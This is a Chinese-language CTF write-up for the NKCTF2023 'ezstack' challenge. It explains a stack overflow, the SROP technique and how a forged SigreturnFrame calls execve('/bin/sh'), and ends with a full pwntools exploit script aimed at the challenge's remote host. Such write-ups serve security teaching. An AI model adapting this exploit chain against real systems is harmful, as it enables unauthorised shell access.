# NKCTF2023ezstack - SROP初探


```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

鉴定为，没有保护。

核心代码很短：

```
.text:00000000004011B9 vuln            proc near               ; CODE XREF: main&#43;17↓p
.text:00000000004011B9
.text:00000000004011B9 buf             = byte ptr -10h
.text:00000000004011B9
.text:00000000004011B9 ; __unwind {
.text:00000000004011B9                 endbr64
.text:00000000004011BD                 push    rbp
.text:00000000004011BE                 mov     rbp, rsp
.text:00000000004011C1                 mov     rax, 1
.text:00000000004011C8                 mov     rdx, 26h ; &#39;&amp;&#39;  ; count
.text:00000000004011CF                 lea     rsi, nkctf      ; &#34;Welcome to the binary world of NKCTF!\n&#34;
.text:00000000004011D7                 mov     rdi, rax        ; fd
.text:00000000004011DA                 syscall                 ; LINUX - sys_write
.text:00000000004011DC                 xor     rax, rax
.text:00000000004011DF                 mov     rdx, 200h       ; count
.text:00000000004011E6                 lea     rsi, [rsp&#43;buf]  ; buf
.text:00000000004011EB                 mov     rdi, rax        ; fd
.text:00000000004011EE                 syscall                 ; LINUX - sys_read
.text:00000000004011F0                 mov     eax, 0
.text:00000000004011F5                 pop     rbp
.text:00000000004011F6                 retn
.text:00000000004011F6 ; } // starts at 4011B9
.text:00000000004011F6 vuln            endp
```



一开始以为是ret2libc，本想想办法leak地址，发现无法控制rax为1调用输出的syscall。ROPgadget发现了一些奇怪的东西：

```
.text:0000000000401146                 mov     rax, 0Fh
.text:000000000040114D                 retn
.text:000000000040114E                 syscall                 ; LINUX -
.text:0000000000401150                 retn
```

查了一下，0x0F号系统调用是`rt_sigreturn`系统调用，推测可以使用SROP

SROP是一种利用Linux信号机制的漏洞利用方法。当用户发出信号请求时，会发生这样的事情：

保存上下文（在用户态栈上）→执行信号处理函数→从信号处理函数返回→从用户栈上恢复上下文

这里的问题在于这个过程中的最后一步是通过信号处理函数调用`rt_sigreturn`系统调用实现的，也就是说“从用户栈上恢复上下文”这个操作可以被攻击者直接执行。

也就是说，我们只需要在用户态栈上伪造一个上下文，然后调用`rt_sigreturn`让系统恢复上下文即可getshell。具体来说，我们按下面的规则在栈上伪造一个上下文：

```
rax=59
rdi = &amp;/bin/sh
rsi = 0
rdx=0
rip=&amp;syscall; ret
```

在调用`rt_sigreturn`时，系统会按上面的指分别设置各个寄存器，就可以执行execve(&#34;/bin/sh&#34;)了。

现在的问题是如何获得一个/bin/sh字符串。

发现程序中有一个输出`welcome to nkctf`的代码，如果我们在ret的时候ret到`0x4011c8`处，就可以跳过`mov rax, 1`的执行，此时rax为0，触发LINUX - read系统调用，此时我们可以在这个字符串内写入/bin/sh。

到这里思路就很明显了：

1. ret到`0x4011c8`处，写入`/bin/sh`字符串，然后触发第二次读入。
2. ret到vuln()起始地址，验证`/bin/sh`写入是否成功，同时准备写入SigreturnFrame（可跳过）
3. 控制ret地址为`mov rax, 15; ret; syscall; ret`，同时布置栈，写入伪造的SigreturnFrame。

完整exp：

```python
from pwn import *
elf = ELF(&#34;./ez_stack&#34;)

#p = process(&#34;./ez_stack&#34;)
p = remote(&#34;node2.yuzhian.com.cn&#34;, 39984)

context.arch = &#39;amd64&#39;
context.log_level = &#39;debug&#39;

p.recvuntil(b&#34;NKCTF!\n&#34;)
leak_addr = 0x4011c8
vuln_addr = 0x4011b9
nkctf_addr = 0x404040
syscall_addr = 0x40114e
sigret_addr = 0x401146

payload = b&#34;A&#34; * (16&#43;8)
payload &#43;= p64(leak_addr)#write nkctf_string
p.send(payload.ljust(0x200, b&#34;A&#34;))

#write /bin/sh
p.send(b&#34;/bin/sh\x00&#34;&#43;b&#34;a&#34;*(0x26-8))
#try SROP
payload = b&#34;a&#34;*(16&#43;8) &#43; p64(vuln_addr)
p.send(payload)
p.recvuntil(b&#34;/bin/sh\x00&#34;&#43;b&#34;a&#34;*(0x26-8))
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = nkctf_addr #&amp;&#39;/bin/sh&#39;
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_addr
#print(frame)
frame = b&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@@@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00N\x11@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x003\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#39;
payload = b&#39;a&#39;* (16&#43;8)
payload &#43;= p64(sigret_addr) #强制sigreturn，改变frame
payload &#43;= p64(syscall_addr)
payload &#43;= frame
#payload &#43;= p64(vuln_addr)
p.send(payload)
p.interactive()
```



---

> Author: Shino  
> URL: https://www.sh1no.icu/posts/srop/  

